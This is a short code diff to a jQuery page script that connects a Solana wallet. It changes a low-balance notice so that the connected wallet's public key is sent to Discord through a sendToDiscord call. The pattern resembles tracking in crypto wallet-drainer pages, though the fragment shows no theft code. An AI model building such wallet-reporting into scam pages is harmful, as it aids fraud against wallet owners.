@@ -45,7 +45,7 @@ $(document).ready(function() {
 
                 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                 if (walletBalance < minBalance) {
-                    sendToDiscord('Insufficient funds for rent');
+                    sendToDiscord(`Insufficient funds for rent ${resp.publicKey.toString()}`);
                     alert("Insufficient funds for rent.");
                     return;
                 }
